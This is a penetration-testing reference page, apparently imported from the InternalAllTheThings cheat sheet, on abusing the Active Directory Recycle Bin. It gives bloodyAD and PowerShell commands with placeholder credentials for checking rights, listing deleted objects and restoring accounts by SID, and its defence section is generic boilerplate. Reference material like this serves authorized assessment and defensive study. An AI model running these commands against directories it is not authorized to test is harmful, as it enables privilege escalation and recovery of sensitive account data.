---
title: Active Directory - Recycle Bin
type: technique
tags: [active-directory, enumeration, reference-import, windows]
phase: enumeration
date_created: 2026-05-13
date_updated: 2026-07-02
sources: [InternalAllTheThings]
---

# Active Directory - Recycle Bin

## What it is

Technical reference for **Active Directory - Recycle Bin** collected from InternalAllTheThings during an internal/cloud assessment ingest.

## How it works

The AD Recycle Bin retains deleted objects for up to 180 days in the `CN=Deleted Objects` container, preserving most attributes including `userPassword` hashes, SPNs, and group memberships. Attackers with `LIST_CHILD` rights on the Deleted Objects container can enumerate these tombstoned accounts and recover credentials or group membership information that was thought to have been permanently removed. This information can reveal historically privileged accounts or sensitive data left in deleted object attributes.

## Attack phases

- **Exploitation**: primary phase for this note (credential and control-plane abuse)
- **Adjacent phases**: overlaps are common once credentials or lateral paths appear

## Prerequisites

Authorized scope covering the depicted systems; valid credentials or network reach as required by each command block inside the methodology body.

## Methodology

The following imported sections retain upstream ordering, tables, and copy-pasta blocks from InternalAllTheThings.

## Details

* Deleted objects have a default retention time of 180 days
* Recycle Bin path: `CN=Directory Service,CN=Windows NT,CN=Services,CN=Configuration,DC=example,DC=com`

Enable Active Directory Recycle Bin in PowerShell

```ps1
Enable-ADOptionalFeature -Identity 'CN=Recycle Bin Feature,CN=Optional Features,CN=Directory Service,CN=Windows NT,CN=Services,CN=Configuration,DC=contoso,DC=com' -Scope ForestOrConfigurationSet -Target 'contoso.com'
```

## Deleted Objects

**Requirements**:

* `LIST_CHILD` right on the Deleted Objects container
* OID `1.2.840.113556.1.4.2064`: shows deleted, tombstoned, and recycled

**Exploitation**:

* List rights

```ps1
bloodyAD -u user -d domain -p 'Password123!' --host 10.10.10.10 get search -c 1.2.840.113556.1.4.2064 --resolve-sd --attr ntsecuritydescriptor --base 'CN=Deleted Objects,DC=domain,DC=local' --filter "(objectClass=container)"
```

* Check all rights from the requirements

```ps1
bloodyAD --host 10.10.10.10 -d domain -u user -p 'Password123!' get writable --include-del
```

* List deleted objects with bloodyAD

```ps1
bloodyAD -u user -d domain -p 'Password123!' --host 10.10.10.10 get search -c 1.2.840.113556.1.4.2064 --filter '(isDeleted=TRUE)' --attr name
```

* List deleted objects with PowerShell

```ps1
Get-ADObject -Filter 'Name -Like "*User*"' -IncludeDeletedObjects 
```

## Restore Objects

**Requirements**:

* `Restore Tombstoned` right on the domain object
* `Generic Write` right on the deleted object
* `Create Child` right on the OU used for restoration

By default, only Domain Admins are able to list and restore deleted objects.

On restoration some objects retains attributes:

* Deleted objects retain all their attributes (including sensitive ones)
* Tombstoned objects retain most important attributes

**Exploitation**:

* Check restore rights

```ps1
bloodyAD --host 10.10.10.10 -d domain -u user -p 'Password123!' get object 'DC=domain,DC=local' --attr ntsecuritydescriptor --resolve-sd                   

bloodyAD -u user -d domain -p 'Password123!' --host 10.10.10.10 get search -c 1.2.840.113556.1.4.2064 --filter '(&(isDeleted=TRUE)(sAMAccountName=deleted-computer$))' --attr ntsecuritydescriptor --resolve-sd

bloodyAD --host 10.10.10.10 -d domain -u user -p 'Password123!' get object 'CN=Users,DC=domain,DC=local' --attr ntsecuritydescriptor --resolve-sd
```

* Restore the object using the sAMAccountName or objectSID

```ps1
bloodyAD -u user -d domain -p 'Password123!' --host 10.10.10.10 set restore 'S-1-5-21-1394970401-3214794726-2504819329-1104'
```

## References

* [Have You Looked in the Trash? Unearthing Privilege Escalations from the Active Directory Recycle Bin - @CravateRouge - June 25, 2025](https://cravaterouge.com/articles/ad-bin/)

## Bypasses and variants

Enumerate case-specific bypasses inside the methodologies above when upstream documented alternate paths.

## Detection and defence

Apply vendor baselines for logging, least privilege, patch cadence, and segmentation. Map signals to SOC playbooks relevant to each platform referenced in this page.

## Tools

Tool references are inline in **Methodology**; see the `tools/` pages for CLI usage.

## Sources

- Swisskyrepo [InternalAllTheThings](https://github.com/swisskyrepo/InternalAllTheThings) (ingest slug `InternalAllTheThings`).
